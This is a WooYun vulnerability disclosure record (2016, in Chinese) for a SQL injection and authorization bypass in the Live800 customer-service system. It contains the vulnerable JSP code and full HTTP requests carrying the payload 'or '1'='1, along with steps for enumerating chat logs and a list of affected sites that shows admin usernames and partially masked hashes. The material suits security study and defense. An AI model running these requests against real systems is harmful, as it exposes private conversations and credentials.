{"id": 86995, "wybug_id": "wooyun-2016-0177533", "wybug_title": "Live800在线客服系统SQL注射/未授权查看对话记录", "wybug_corp": "live800.com", "wybug_author": "applychen", "wybug_date": "2016-02-21 22:49", "wybug_open_date": "2016-05-22 11:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["越权", "代码审计"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-02-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-02-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-02-25：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-04-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-22：\t细节向公众公开  简要描述： SQL注射影响诸多大站，可看对话记录。 详细说明：  SQL注射发生在chatListForVisitor.jsp文件中的userId参数：\nString companyId = request.getParameter(\"companyId\");\tString userId = request.getParameter(\"userId\");\tString sId = request.getParameter(\"sId\");\ttry{\t\tif(StringUtils.isNullOrLengthZero(new String[]{companyId,userId,sId})){\t\t\tout.println(\"<p align='center'><font color='red'>错误请求</font></p>\");\t\t\treturn;\t\t}\t\tif(!sId.equals(session.getId())){\t\t\tout.println(\"<p align='center'><font color='red'>非法请求</font></p>\");\t\t\treturn;\t\t}\t\tif(session.getAttribute(\"hasLogin\")==null){\t\t\tout.println(\"<p align='center'><font color='red'>非法请求</font></p>\");\t\t\treturn;\t\t}\t}catch(Exception e){\t\tout.println(\"<p align='center'><font color='red'>非法请求</font></p>\");\t\treturn;\t}\tjava.text.SimpleDateFormat formatter = new java.text.SimpleDateFormat(\t\t\t\t\t\"yyyy-MM-dd\");\tGregorianCalendar day = new GregorianCalendar();\tDate today = day.getTime();\tString todayStr = formatter.format(today);\tday.add(GregorianCalendar.DATE, -30);\tDate yesterday = day.getTime();\tString yesterdayStr = formatter.format(yesterday);\tMap<String,String> speParaMap = new HashMap<String,String>();\tString fromTime = yesterdayStr+\" 00:00:00\";\tString toTime = todayStr+\" 23:59:59\";\tspeParaMap.put(\"companyId\",companyId);\tspeParaMap.put(\"userId\",userId);\tspeParaMap.put(\"fromTime\",fromTime);\tspeParaMap.put(\"toTime\",toTime);\tpageContext.setAttribute(\"companyId\",companyId);\tboolean res = ValueListUtil.setValueList(speParaMap, pageContext,\t\t\t\"chatInfoAdapter_chatQuery_for_visitor\", \"list\");\tif (!res) {\t\trequest.setAttribute(\"list\", new DefaultListBackedValueList(\t\t\t\tnull, null));\t}\n要成功访问这个文件要满足以下两个条件：\nif(!sId.equals(session.getId())){\t\t\tout.println(\"<p align='center'><font color='red'>非法请求</font></p>\");\t\t\treturn;\t\t}\t\tif(session.getAttribute(\"hasLogin\")==null){\t\t\tout.println(\"<p align='center'><font color='red'>非法请求</font></p>\");\t\t\treturn;\t\t}\n第一是sId要与sessionid相等，第二是session里面的hasLogin不等于null。第一处条件，在上一个漏洞描述过http://**.**.**.**/bugs/wooyun-2016-0177183不再赘述。第二处条件，在chatbox.jsp文件中设置了hasLogin为1：\n//如果是出现韦博英语，选择地区后就会重新刷这个页面，就会获取不到referer，所以加以标识。\t\tsession.setAttribute(\"hasLogin\",\"1\");\t\tCompanyInfo companyInfo = DBManager.getValidCompanyInfo(companyId);\n在利用的时候首先访问chatbox.jsp往session中写入hasLogin，然后记下其中的JSESSIONID：\nGET /live800/chatClient/chatbox.jsp?companyID=1&configID=10&skillId=17&enterurl=http%3A%2F%2F**.**.**.**%2Findex.html&k=1&remark= HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateConnection: keep-alive\n\n\n然后使用刚才记录下的JSESSIONID构造以下的数据包[标记1]：\nPOST /live800/chatListForVisitor.jsp HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedCookie: JSESSIONID=AA2AC6B345DC64287B69997954DE91A4Connection: keep-aliveContent-Length: 60companyId=8922&userId=1&sId=AA2AC6B345DC64287B69997954DE91A4\n当userId='or '1'='1即可查看对话记录：\nPOST /live800/chatListForVisitor.jsp HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedCookie: JSESSIONID=AA2AC6B345DC64287B69997954DE91A4Connection: keep-aliveContent-Length: 60companyId=8922&userId='or '1'='1&sId=AA2AC6B345DC64287B69997954DE91A4\n\n\n通过以下的数据包即可查询聊天记录：\nGET /live800/chatDetail_brief_show_for_visitor.jsp?companyId=8922&msgId=3841000 HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://**.**.**.**/live800/chatListForVisitor.jspCookie: JSESSIONID=AA2AC6B345DC64287B69997954DE91A4Connection: close\n\n\n遍历msgId参数即可查询大量的聊天记录：\n\n将[标记1]的数据包放到SQLMAP中跑出数据：\n\n登录后台查看数据http://**.**.**.**/bugs/wooyun-2015-0147511：\n\n\n\n列出部分受影响的站点：\nhttp://**.**.**.**/live800/:::admin::::zV6nPNWP******GyZsuY=http://**.**.**.**/live800/::: gys_德恩特02::::cvIO/fr******hxi0=http://**.**.**.**/live800/:::1001::::NpZ+40n******JrLtP8=http://**.**.**.**/live800/:::dinglong1::::ysF8qST******zN6LQ=http://**.**.**.**/live800/:::002::::ok3/8CIFF******zTVY=http://**.**.**.**/live800/:::80002::::5r0uWpi+******QbCGhwc=http://**.**.**.**/live800/:::bangfringe::::0FL4X6******Eqao=http://**.**.**.**:8080/live800/:::027022::::+yIR83******Q8i+50=http://**.**.**.**/live800/:::abbyouyang::::fEqNC******4lBs=http://**.**.**.**/live800/:::bing_zeng::::GQFXt2******xhphg=http://**.**.**.**/live800/:::ailizhen::::Bf50Yc******an0Oo=http://**.**.**.**/live/:::123456::::ItpSfT******PH/7U=http://**.**.**.**/live800/:::caiqj::::Y2fEjdG******Up9e4=\n   漏洞证明：  同上   修复方案：  配置filter全局过滤request输入   版权声明：转载请注明来源 applychen@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2016-02-22 11:31 厂商回复： 非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-02-21 23:03 |    \t\tpudding2 \t\t\t( 普通白帽子  |\t\t\t        Rank:121 漏洞数:43        | 新人报道，请多关照)\t\t \n  yaoyaoyao~~~16年live800的第三弹    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}